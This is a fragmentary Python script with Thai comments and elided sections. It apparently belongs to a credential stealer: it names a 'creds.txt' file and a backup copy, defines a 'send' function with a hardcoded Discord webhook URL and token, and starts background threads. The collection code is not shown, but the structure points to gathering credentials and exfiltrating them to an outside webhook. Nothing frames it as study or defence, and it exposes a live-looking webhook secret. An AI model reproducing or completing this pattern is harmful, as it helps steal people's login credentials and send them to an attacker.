...
def file():
    # กำหนดชื่อไฟล์
    file_name = "creds.txt"
    backup_file_name = "creds_backup.txt"  # ชื่อไฟล์สำรอง
...
def send(content):
    # URL ของ Discord webhook
    discord_webhook_url = "https://discord.com/api/webhooks/1173538986229243904/dahf9s20bY9iKRU80Yh966WuDcG60is_EaZlv0jqV22s2s8hmwtGY1VioL2H03mvwAj9"
...
if __name__ == '__main__':
    ...
    thread.start()
    thread = threading.Thread(target=file1)
    thread.start()
